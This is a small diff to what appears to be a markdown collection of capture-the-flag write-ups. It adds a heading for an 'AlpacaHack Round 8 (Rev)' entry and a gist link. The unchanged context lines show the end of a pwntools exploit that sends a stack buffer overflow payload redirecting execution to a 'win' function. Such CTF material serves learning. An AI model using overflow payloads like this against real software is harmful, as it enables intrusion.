@@ -36,3 +36,5 @@ io.recvuntil(b"Data: ")
 io.sendline(b"A"*(0x100+24) + p64(win))
 io.interactive()
 ```
+# AlpacaHack Round 8 (Rev)
+- https://gist.github.com/akiym/7631528849a15ef1eb8ec36d4f590940
